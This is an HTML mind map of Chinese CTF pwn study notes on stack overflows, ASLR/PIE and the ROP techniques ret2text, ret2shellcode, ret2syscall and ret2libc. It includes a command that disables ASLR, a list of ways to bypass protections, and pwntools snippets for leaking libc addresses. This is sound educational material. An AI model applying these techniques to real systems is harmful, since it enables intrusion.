@@ -1,0 +1,1343 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN6</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="1cu967j5573ngdg2k51spbjti1">CTF PWN6</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN6_files/images/CTF PWN6.jpg"></div>
+<h2 class="topic">
+<a name="287vunq20li0dn3bovbc3pd4v4">学习目标，开始系统学习CTF-wiki中的知识</a>
+</h2>
+<h3 class="topic">
+<a name="65p9r0eal0dr8q8pvgejt9mesg">&nbsp;https://wiki.x10sec.org/pwn/arm/environment/</a>
+</h3>
+<h2 class="topic">
+<a name="2shtk0karnen9f0a21shjrd73k">栈溢出</a>
+</h2>
+<h3 class="topic">
+<a name="73l99n9nsn65200fjmf992f8cj">&nbsp;栈介绍</a>
+</h3>
+<h3 class="topic">
+<a name="5bjtgoksa6hkcfajvsdj67sh9l">&nbsp;&nbsp;栈从进程地址空间的高地址到低地址进行增长</a>
+</h3>
+<h3 class="topic">
+<a name="50shqotq79j7ate09cj0ct0u1e">&nbsp;&nbsp;函数调用约定</a>
+</h3>
+<h3 class="topic">
+<a name="0d0lfhgdklq0bdtluv52fsfbiu">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4bgpje6333ucs5n7u74p8sq7ki.png"></p>
+<h3 class="topic">
+<a name="4hnmkhoh1sm0303a81ilepsqqr">&nbsp;&nbsp;x86函数返回值传递方法</a>
+</h3>
+<h3 class="topic">
+<a name="0hvp25uamm06dvtul2qqvt3a6p">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/49i6li779nilfn33fior0hmknc.png"></p>
+<h3 class="topic">
+<a name="74lhoqev4ld3te83kn6rjjac0o">&nbsp;&nbsp;x64寄存器</a>
+</h3>
+<h3 class="topic">
+<a name="4nhs2qo7cd2lr5edjdt6q12srm">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4sgevjv534cffv1j0anfdacdjj.png"></p>
+<h3 class="topic">
+<a name="13nrfps649gm15kd4vnkb95f4q">&nbsp;&nbsp;x86与x64传参区别</a>
+</h3>
+<h3 class="topic">
+<a name="0rel26v1qe2b7jn4hakkm2rhcm">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/71r8ud0unq1tutpj7uttpdpvjs.png"></p>
+<h3 class="topic">
+<a name="0eimigqn2j23nvk97df9koa3he">&nbsp;栈溢出基础</a>
+</h3>
+<h3 class="topic">
+<a name="1s9bm82ghtkdtmhf1608bpotqk">&nbsp;&nbsp;即使可执行程序开启了PIE也需要操作系统开启ASLR才能真正实现随机基址加载，如果开启了pie但系统没有开启ASLR则成程序会被加载到固定基址（不过和 No PIE 时基址不同）</a>
+</h3>
+<h3 class="topic">
+<a name="6are1c3g6a8qqqmgtiirrktprv">&nbsp;&nbsp;&nbsp;控制系统是否开启aslr</a>
+</h3>
+<h3 class="topic">
+<a name="3kl9n53b56afl9b8q75k4cm9m9">&nbsp;&nbsp;&nbsp;&nbsp;/proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否，具体的选项有&#13;
+&#13;
+0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。&#13;
+1，普通的 ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化。&#13;
+2，增强的ASLR，在 1 的基础上，增加了堆基地址随机化。</a>
+</h3>
+<h3 class="topic">
+<a name="358e397h8693po20lu4uqi5885">&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</a>
+</h3>
+<h3 class="topic">
+<a name="2di02ud2d0hsfu68bcsksf66uo">&nbsp;&nbsp;ida分析技巧：确定局部变量在栈中的长度</a>
+</h3>
+<h3 class="topic">
+<a name="5fku6vp11sbt5i0a2hd5377ra7">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/2m7pfid829kmlljj7f090e66ov.png"></p>
+<h3 class="topic">
+<a name="00adshogvt9apn8eb3c08barta">&nbsp;&nbsp;关键步骤</a>
+</h3>
+<h3 class="topic">
+<a name="2f0u6cp9mj6qt0vggcmq11pfkd">&nbsp;&nbsp;&nbsp;寻找漏洞函数</a>
+</h3>
+<h3 class="topic">
+<a name="0kp6086r6h6gu89qcrdkdabcvq">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/51mut6gnn4e5v5vum7vvoblg66.png"></p>
+<h3 class="topic">
+<a name="3rlhcu9ltvrf050p13ves4i4vk">&nbsp;&nbsp;&nbsp;确定溢出数据长度</a>
+</h3>
+<h3 class="topic">
+<a name="3edvcc3gpnnv3ps7u6mi4m266h">&nbsp;&nbsp;&nbsp;&nbsp;一般变量索引方式</a>
+</h3>
+<h3 class="topic">
+<a name="73lmjuf95birum8rij12rupk7p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/19ultslabmje1d2vcv5dl1hd3g.png"></p>
+<h3 class="topic">
+<a name="4u8lsk17kv26qag4krifoa7563">&nbsp;&nbsp;&nbsp;&nbsp;通常覆盖目标</a>
+</h3>
+<h3 class="topic">
+<a name="50lo1ir6asnjaq5dd6iiapm8rm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目的是控制程序执行流程</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6qcljqpkkbnmnt4ak743ans8nh.png"></p>
+<h3 class="topic">
+<a name="1kvir01eo9r8usqhk1fbgh5rgn">&nbsp;&nbsp;延伸阅读</a>
+</h3>
+<h3 class="topic">
+<a name="0fv05kugavckq87su8g9dq08cr">&nbsp;&nbsp;&nbsp;ASLR与PIE的区别</a>
+</h3>
+<h3 class="topic">
+<a name="6chb66hpt1p1u72glk79m3oeob">&nbsp;&nbsp;&nbsp;&nbsp;aslr</a>
+</h3>
+<h3 class="topic">
+<a name="42f9lfks3u138um2ngjbm02cen">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;操作系统体提供的功能</a>
+</h3>
+<h3 class="topic">
+<a name="0l06lgk7cft7li6naigeaofha4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作用于可执行文件装入内存中时</a>
+</h3>
+<h3 class="topic">
+<a name="6o5tsgfsppmd21411booagfj3p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;能够随机化stack、heap、libraries的基址</a>
+</h3>
+<h3 class="topic">
+<a name="6jflhp55fpcq2tu9cbkcnp076v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ASLR有0/1/2三种级别，其中0表示ASLR未开启，1表示随机化stack、libraries，2还会随机化heap</a>
+</h3>
+<h3 class="topic">
+<a name="2k58ble5e9i3928qjks44qgnqs">&nbsp;&nbsp;&nbsp;&nbsp;pie</a>
+</h3>
+<h3 class="topic">
+<a name="75k6p1bqj945cq0aa7jrateum0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编译器选项</a>
+</h3>
+<h3 class="topic">
+<a name="7smqofdfomvcola099a45sof2e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PIE选项编译出来的ELF可执行文件用file命令查看会显示其为so</a>
+</h3>
+<h3 class="topic">
+<a name="0fskt9efi3f5hmbfclkdi4g2uv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作用于可执行文件的编译过程，用于生成支持在任意基址加载代码</a>
+</h3>
+<h3 class="topic">
+<a name="1oicfn5sfssg9gh92db817aegu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随机化elf装载内存的基址（该基址是代码段、plt、got、data等共同的基址，所以某种角度说，可以随机化可执行文件各个区段的基址）</a>
+</h3>
+<h3 class="topic">
+<a name="6qmu24unh7gs7vkcde2vrhqftn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当aslr=0时，即使pie开启，elf加载基址也不会变</a>
+</h3>
+<h3 class="topic">
+<a name="0ubcc72glgpiok1ldnvnvu2d9a">&nbsp;&nbsp;&nbsp;&nbsp;当aslr=1 没有开启pie时</a>
+</h3>
+<h3 class="topic">
+<a name="156bvqgiekdat97abi760ed10c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序加载基址不变，但是程序进程中栈基址和共享库基址会变</a>
+</h3>
+<h3 class="topic">
+<a name="2a1e29q8q5l7hot4j1c2ca3s69">&nbsp;&nbsp;&nbsp;&nbsp;当aslr=2 开启pie时</a>
+</h3>
+<h3 class="topic">
+<a name="6mqasdtc5mp6f0g7e7kj60o8af">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序加载基址、堆、栈、共享库基址均会变</a>
+</h3>
+<h3 class="topic">
+<a name="48t7v572t4jmub27e96oejc0vd">&nbsp;&nbsp;&nbsp;&nbsp;当aslr=1 开启pie时</a>
+</h3>
+<h3 class="topic">
+<a name="6rjenmcvkk6im8fd7e90q37qig">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;按照asltr的定义，heap基址不会发生变化，但是由于pie开启，程序加载基址随机化，heap基址于加载基址偏移一定，则实际上heap的基址也会发生变化</a>
+</h3>
+<h3 class="topic">
+<a name="4r43a2gvom37viubihp0go6efd">&nbsp;&nbsp;&nbsp;&nbsp;https://www.cnblogs.com/rec0rd/p/7646857.html</a>
+</h3>
+<h3 class="topic">
+<a name="7l711jqt3lgmqhvk7hr3ut4jja">&nbsp;&nbsp;&nbsp;栈溢出的保护基址和让绕过方法</a>
+</h3>
+<h3 class="topic">
+<a name="7clrukllo8hin56e5ltbpj4i3f">&nbsp;&nbsp;&nbsp;&nbsp;保护机制NX/DEP 绕过方法ROP</a>
+</h3>
+<h3 class="topic">
+<a name="5p3blo3k6qngg1l0bic0q11lt8">&nbsp;&nbsp;&nbsp;&nbsp;保护机制ASLR 绕过方法infoleak 、ret2dlresolve 、ROP</a>
+</h3>
+<h3 class="topic">
+<a name="6s9c9e66h2np8fmo60aqns3s9n">&nbsp;&nbsp;&nbsp;&nbsp;保护机制Stack Canary/ Cookie 绕过方法infoleak</a>
+</h3>
+<h3 class="topic">
+<a name="59ubf60fa4icfrk4ojggodghkl">&nbsp;&nbsp;&nbsp;&nbsp;rop学习资源</a>
+</h3>
+<h3 class="topic">
+<a name="51em587qdsjt49tcakpk6vjp71">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;蒸米的一步一步学ROP简直是经典篇目。</a>
+</h3>
+<h3 class="topic">
+<a href="https://www.anquanke.com/post/id/85831" name="494dd47a2afa3uc0ik4b972hig">&nbsp;&nbsp;&nbsp;&nbsp;https://www.anquanke.com/post/id/85831</a>
+</h3>
+<h3 class="topic">
+<a name="55j9qkft23927su29uk4cf37hd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这部分学习资料在完成ctf-Wiki栈相关内容之后再继续学习</a>
+</h3>
+<h3 class="topic">
+<a name="4lpimmgbp4l7jn7sbq2prcbicc">&nbsp;基本ROP</a>
+</h3>
+<h3 class="topic">
+<a name="7udqsq97irjgqhiq3f4rtkmfrn">&nbsp;&nbsp;ret2text</a>
+</h3>
+<h3 class="topic">
+<a name="6v3mpqfrse02odr9s9e2nu9opv">&nbsp;&nbsp;&nbsp;ret2text 即控制程序执行程序本身已有的的代码(.text)</a>
+</h3>
+<h3 class="topic">
+<a name="2sinl7f1jdh1hcqfc80b849hbd">&nbsp;&nbsp;&nbsp;例子 ctf pwn4中的pwn_by_example_1_ret2text</a>
+</h3>
+<h3 class="topic">
+<a name="4a9h7rb3qusr3trs6vegur0n3k">&nbsp;&nbsp;&nbsp;&nbsp;即被执行程序中存在完整的system('/bin/sh')调用，并且没保护机制只开了nx，所以程序可以直接将返回地址覆盖为system('/bin/sh')调用的地址</a>
+</h3>
+<h3 class="topic">
+<a name="3dtjk1d7n55d1bgbdglgq7pbp2">&nbsp;&nbsp;&nbsp;当通过汇编手动计算返回地址偏移时，可以根据此时esp ebp的值作为计算依据</a>
+</h3>
+<h3 class="topic">
+<a name="0ek7kreb3u9o7kku03rkp5upo4">&nbsp;&nbsp;&nbsp;&nbsp;注意此时目标是通过溢出覆盖main函数的返回地址，而不是覆盖gets函数的返回地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/1kq0ke34a29mgbpceae5q16n52.png"></p>
+<h3 class="topic">
+<a name="1nrrdnshp3uh6jibaqna6pntnv">&nbsp;&nbsp;ret2shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="45k7fivbpgh8ivkmh8l7ejsgg0">&nbsp;&nbsp;&nbsp;自己通过输入填充shellcode，并且ret到shellcode中执行，注意可行的前提是shellcode所在的内存空间具有可执行属性，即nx为disable</a>
+</h3>
+<h3 class="topic">
+<a name="2sif2hak2d91t43bno3m43lmp1">&nbsp;&nbsp;&nbsp;查看指定内存地址是否可执行</a>
+</h3>
+<h3 class="topic">
+<a name="4gs7og2jksgbs2jotu95jc2ngc">&nbsp;&nbsp;&nbsp;&nbsp;通过ida确定数据传输的目的地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7da1f4r0n9pkkmmhsc9gnj0aqi.png"></p>
+<h3 class="topic">
+<a name="5hmcmeaqkc0hqeh5ud5scedka0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过vmmap确定内存属性</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6ufj942p99tlgkcdu7g6e0mc8m.png"></p>
+<h3 class="topic">
+<a name="74f0mcaqd2fjrnvergqlbmtquo">&nbsp;&nbsp;&nbsp;下来需要详细调试下，最后漏洞利用时仍然输出了byeye，所以推测最后被覆盖的返回的地址应该时printf函数或main函数的，那么溢出过程中gets函数的返回地址应该也已经被修改，程序是如何继续执行strncpy然后将shellcode复制到bss段的呢？</a>
+</h3>
+<h3 class="topic">
+<a name="1i595en7e2ml27k6l2l157qihv">&nbsp;&nbsp;&nbsp;题目</a>
+</h3>
+<h3 class="topic">
+<a name="3q8f7c9ft8vvpmrfuip19mbbh9">&nbsp;&nbsp;&nbsp;&nbsp;sniperoj-pwn100-shellcode-x86-64</a>
+</h3>
+<h3 class="topic">
+<a name="6i3hf5e34cpqk1r6qhdknmg9m4">&nbsp;&nbsp;ret2syscall</a>
+</h3>
+<h3 class="topic">
+<a name="142sphobvmtfad56iev6dpotad">&nbsp;&nbsp;&nbsp;当程序text中不存在现成的函数调用（ret2text）并且因为nx的存在无法在堆栈中执行指令（ret2shelllcode），此时可以使用gadget拼接一段shellcode从而执行</a>
+</h3>
+<h3 class="topic">
+<a name="1sipd4eadnb66rn491u6ld6dtc">&nbsp;&nbsp;&nbsp;linux中的系统调用 int 0x80触发中断，eax中存放要调用的函数的编号，函数前六个参数分别保存在ebx ecx edx esi edi</a>
+</h3>
+<h3 class="topic">
+<a name="7bmin5061af90mv8l4ffpim1d1">&nbsp;&nbsp;&nbsp;&nbsp;中断处理程序执行流程</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/3qd8rrtf07cqgmuvakh7aooqpj.png"></p>
+<h3 class="topic">
+<a name="5pvg66ohh0n5gp90g32djmcubf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linxu中函系统调用方式</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/11ommdlgld8ba650btr85o2ju9.png"></p>
+<h3 class="topic">
+<a name="4vom908dv4saccmei9quqj5prm">&nbsp;&nbsp;&nbsp;&nbsp;例如调用如果要调用execve("/bin/sh",NULL,NULL)函数huodeshell</a>
+</h3>
+<h3 class="topic">
+<a name="432qs86kil1oco4bb10jk2u5nc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/405hsslgbbhqdvlin3cb4p2msr.png"></p>
+<h3 class="topic">
+<a name="68a4mm7b7jkf5a6o1cpq24ej6r">&nbsp;&nbsp;&nbsp;使用ROPgadget搜索gadget</a>
+</h3>
+<h3 class="topic">
+<a name="08a98q2cas9opbai7j5e8gulbu">&nbsp;&nbsp;&nbsp;&nbsp;搜索pop eax ret</a>
+</h3>
+<h3 class="topic">
+<a name="71did5fjoae80j9of4vqsadvob">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/66j9itqicpb80ftk5i9hhlutj6.png"></p>
+<h3 class="topic">
+<a name="55rnfqjsk7kkp0tajjr5es3bu2">&nbsp;&nbsp;&nbsp;&nbsp;搜索 pop edx ; pop ecx ; pop ebx ; ret</a>
+</h3>
+<h3 class="topic">
+<a name="2ejvece955gdfacqmhqqt34vog">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/5fvcavd3alce7kq7cjdc6fs5el.png"></p>
+<h3 class="topic">
+<a name="17erid8uuibnf3qa6s0e3kohai">&nbsp;&nbsp;&nbsp;&nbsp;搜索'/bin/sh'字符串</a>
+</h3>
+<h3 class="topic">
+<a name="1ulcrr7qltc9b84th30lh7jima">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4jo67ao9gsull3gsbmf40u6oo9.png"></p>
+<h3 class="topic">
+<a name="1d14etgt56vmjeo4dv58v0k9rj">&nbsp;&nbsp;&nbsp;&nbsp;搜索int 0x80</a>
+</h3>
+<h3 class="topic">
+<a name="4pvasmrrnumklphg4387hanclo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/4idi5dca40nj9urn1hg4m64j9g.png"></p>
+<h3 class="topic">
+<a name="667im35ito6mecht2u0m2bp8nm">&nbsp;&nbsp;&nbsp;&nbsp;也可使用ROPgadget直接生成rop链</a>
+</h3>
+<h3 class="topic">
+<a name="17ek6h0msvqj3jkg091g0e02h9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/66bobpa1u098p0fn9a9nscpe2h.png"></p>
+<h3 class="topic">
+<a name="1g61oe02v8t238eb3tt7hof6jf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;引入工具ROPgadget使用</a>
+</h3>
+<h3 class="topic">
+<a name="2cos2onvh1fm5g1heus2vcaedq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意指令中的rop是可执行文件名</a>
+</h3>
+<h3 class="topic">
+<a name="40oqbe121o7mvc0jigcqhn1425">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种方法在程序是静态链接的时候比较适用</a>
+</h3>
+<h3 class="topic">
+<a name="5ocacafhddo186brja5j08bk1s">&nbsp;&nbsp;&nbsp;最终的exp</a>
+</h3>
+<h3 class="topic">
+<a name="0abadfm53la462uaj32f59opeb">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6o0d8odd5iud6jov83g6vc8bfs.png"></p>
+<h3 class="topic">
+<a name="72sg44m875vaugl8roksb1i2bi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意flat函数</a>
+</h3>
+<h3 class="topic">
+<a name="3qae096mbjlm9ecu64c60ocgql">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/2ssoivtmqegh1laa60amrk41bt.png"></p>
+<h3 class="topic">
+<a name="21rso97ebrgfrhnbn0atkme6i5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该函数将嵌套的数组或元素全部转化为字符串，可以用于将多个部分的数据组织成shellshellcode</a>
+</h3>
+<h3 class="topic">
+<a href="https://docs.pwntools.com/en/stable/util/packing.html?highlight=flat#pwnlib.util.packing.flat" name="0913r9pntkhq8puslvppegrmhv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://docs.pwntools.com/en/stable/util/packing.html?highlight=flat#pwnlib.util.packing.flat</a>
+</h3>
+<h3 class="topic">
+<a name="4obnr5i7o8tjk6u5vn5keeb0rs">&nbsp;&nbsp;&nbsp;注意linux中系统调用的方式有三种</a>
+</h3>
+<h3 class="topic">
+<a name="517qd99mj9nlb7i57g5n0152lt">&nbsp;&nbsp;&nbsp;&nbsp;int 0x80</a>
+</h3>
+<h3 class="topic">
+<a name="0rp2s6rt57h701nu7k2nldejfe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最传统的系统调用方式，速度较慢，下面两种都是快速系统调用方式</a>
+</h3>
+<h3 class="topic">
+<a name="18smr76fjstbbrdrm656416vnb">&nbsp;&nbsp;&nbsp;&nbsp;sysenter</a>
+</h3>
+<h3 class="topic">
+<a name="5t40qjigpcf890o4hiac331s51">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intel32位架构中使用</a>
+</h3>
+<h3 class="topic">
+<a name="694imoj6g39nv0dtotretpfej2">&nbsp;&nbsp;&nbsp;&nbsp;syscall</a>
+</h3>
+<h3 class="topic">
+<a name="4sgt2v0v4vqs2b3kvia6j7o79q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intel64位架构、AMD32位架构、AMD64位架构使用</a>
+</h3>
+<h3 class="topic">
+<a name="46hd50t5evmmdoj08sthcue0om">&nbsp;&nbsp;&nbsp;&nbsp;其中int 0x80的原理被运用于ret2syscall的漏洞利用方式中，即在内存中寻找int 0x80指令的地址，然后通过搜搜gadget构造int 0x80的参数传递</a>
+</h3>
+<h3 class="topic">
+<a name="7uqe66hcet580v7615oi1bc9as">&nbsp;&nbsp;&nbsp;&nbsp;所以除了int 0x80，也有其他的系统调用方式可以被ret2syscall进行漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="5vmi0587kglt2vlnq48gq424hn">&nbsp;&nbsp;&nbsp;&nbsp;https://cloud.tencent.com/developer/article/1492374</a>
+</h3>
+<h3 class="topic">
+<a name="45kpg7kbmmoglgec7kfaiedvkv">&nbsp;&nbsp;&nbsp;使用ret2syscall要求可执行文件中存在大量指令，所以一般用于静态链接程序的漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="0392qcis986ic5un1bvdiou3fu">&nbsp;&nbsp;ret2libc</a>
+</h3>
+<h3 class="topic">
+<a name="7stpj8vee6oqin8u014v050bcf">&nbsp;&nbsp;&nbsp;gef和pwndbg种均可以通过search搜索字符串</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/2jiihiabmephmfqhv3o7u2udtl.png"></p>
+<h3 class="topic">
+<a name="2gj5bm7op8m1tcoeipc6r14vuh">&nbsp;&nbsp;&nbsp;即函数返回的地址为libc共享库中的地址，这就意味着程序一定是动态链接的，并且可以使用&#13;
+elf=ELF('文件名')&#13;
+elf.plt['函数名']&#13;
+elf.got['函数名']&#13;
+elf.symbola['函数名']  #一般用于获得函数在lib中的偏移&#13;
+以上指令获取函数地址</a>
+</h3>
+<h3 class="topic">
+<a name="75ms5rps1r48dkq36l0r4bdpah">&nbsp;&nbsp;&nbsp;&nbsp;同时也会面临共享库libc随机基址加载的问题，此时就需要通过泄露函数地址从而计算libc加载基址</a>
+</h3>
+<h3 class="topic">
+<a name="246cgde4kgmc50bgacjtlgjbcq">&nbsp;&nbsp;&nbsp;例题1</a>
+</h3>
+<h3 class="topic">
+<a name="44tksm7fkcc98kcg1lukmau31b">&nbsp;&nbsp;&nbsp;&nbsp;使用ROPgadget搜索字符串</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/6npqm0c8umm51d4b46fe4tu60t.png"></p>
+<h3 class="topic">
+<a name="5aj9v5bd6uve94ggerqdb7h148">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以通过gef或pwndbg，使用search指令搜索字符串</a>
+</h3>
+<h3 class="topic">
+<a name="3pclrvhg2jsetkh07q5knpk6i6">&nbsp;&nbsp;&nbsp;&nbsp;通过ida查找system函数是否存在</a>
+</h3>
+<h3 class="topic">
+<a name="20t6449rch1ofq87s5d5vh9jh6">&nbsp;&nbsp;&nbsp;&nbsp;本题中system函数和'/bin/sh'字符串均存在，可以直接用于构造shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="3r6gu7f4n468krar7bs1fpfqpd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/7keh8e728up4kui2mgque39cvm.png"></p>
+<h3 class="topic">
+<a name="2rpiuvh753dag3b0vlvk7ct5ne">&nbsp;&nbsp;&nbsp;例题2</a>
+</h3>
+<h3 class="topic">
+<a name="1ir73o44qn89edo6a8vvlftocr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN6_files/01oqpjumjlp6pijc0799bvt47p.png"></p>
+<h3 class="topic">
+<a name="7qv258ji9t26gujfug27pseelj">&nbsp;&nbsp;&nbsp;&nbsp;与例1区别在于可执行程序中没有现成的'/bin/sh'字符串，（'/bin/sh'字符串存在于libc中，但是lib开启了pic即其可以任意基址加载，所以其中的地址不能直接使用，但是例1例2的可执行文件中均存在system函数，故system函数的地址仍保存在可执行文件的PLT表中，故可以通过elf.plt['system']获得）</a>
+</h3>
+<h3 class="topic">
+<a name="24v920232gq1tso9nmukp6n4ma">&nbsp;&nbsp;&nbsp;例题3</a>
+</h3>
+<h3 class="topic">
+<a name="1v3km18ekrdb2hpb87adsmsi0v">&nbsp;&nbsp;&nbsp;&nbsp;本题在题二的基础上可执行程序中没有使用到sysytem函数，所以不能使用elf.plt['system']获得system函数地址，又因为libc本身是支持随机基址加载的，所以需要先泄露lib中一个函数的地址（该函数必须被可执行执行文件中引用，即存在执行文件的got表中）然后根据该函数距离libc模块首地址的偏移判断libc版本（需要使用libc-database），并计算出libc加载基址，然后加上system函数在libc中的偏移，最后获得system函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="3vi1letsv9aug3iaicgtrurlic">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/niklasb/libc-database</a>
+</h3>
+<h3 class="topic">
+<a name="0bkocd5m9m2ingbd05ep967jb4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/lieanu/LibcSearcher</a>
+</h3>
+<h3 class="topic">
+<a name="1m8sfqbfs29pe9sp2k1tfbqa6n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个libc利用工具</a>
+</h3>
+<h3 class="topic">
+<a name="19nqippj9tn35k0ho025lu062v">&nbsp;&nbsp;&nbsp;&nbsp;确定system函数的过程</a>
+</h3>
+<h3 class="topic">
+<a name="7b8nbs4u37fl1tbt5tt9nn4k5e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前提</a>
+</h3>
+<h3 class="topic">
+<a name="6932f43kcc8kiv13sbff2921s0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system函数属于libc动态链接库，而动态链接库中的函数之间相对偏移为固定的</a>
+</h3>
+<h3 class="topic">
+<a name="3fpn11hu5nram1ql1vhho2898s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ASLR只能针对地址中间位进行随机，地址最低12位并不会发生改变，可以通过特定函数及其地址的后12位确定该函数所属的libc的版本（使用libc-datase）</a>
+</h3>
+<h3 class="topic">
+<a name="2omua3fq60jiestske2iu1uro6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/niklasb/libc-database</a>
+</h3>
+<h3 class="topic">
+<a name="57pellaq71pardvjhmbv1982a4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露指定函数的内存地址并确定libc中的其他函数的低地址</a>
+</h3>
+<h3 class="topic">
+<a name="6mjfs5no6fvn55mcq4lcb7el4c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elf=EFL(可执行文件路径)&#13;
+lib=EFL(libc库路径)&#13;
+可执行文件中A函数got表项地址=elf.got['A']&#13;
+可执行文件中A函数PLT表项地址=elf.PLT['A']&#13;
+输出地址elf.got['A']处的内容，可以获得A函数在libc库中的地址，并且因为延迟绑定，在A函数地址泄露前该函数必须被调用过&#13;
+（也可以通过输出地址elf.PLT['A']中的前5个字节内容，内容四字节即为A函数在libc中的地址）&#13;
+&#13;
+lib加载基地址=A函数地址-lib.symbols['A']  注意这里使用到了lib。而不是elf，查找A函数在libc中的偏移&#13;
+B函数地址=lib加载基地址+lib.symbols['B']</a>
+</h3>
+<h3 class="topic">
+<a name="3k8hj0rt4a51otak34ushtbaum">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获得libc中指定函数的地址后，确定libc的版本和其他函数的地址会比较麻烦，可以使用LibcSearcher工具，直根据函数名和函数地址，就可以获得相应libc中的其他函数在libc中的相对于libc加载基址的偏移</a>
+</h3>
+<h3 class="topic">
+<a href="https://github.com/lieanu/LibcSearcher" name="429rvj182rkf1dhjaiguicbkd9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/lieanu/LibcSearcher</a>
+</h3>
+<h3 class="topic">
+<a name="7vuv5dm2dumkegmcucefvsr15q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
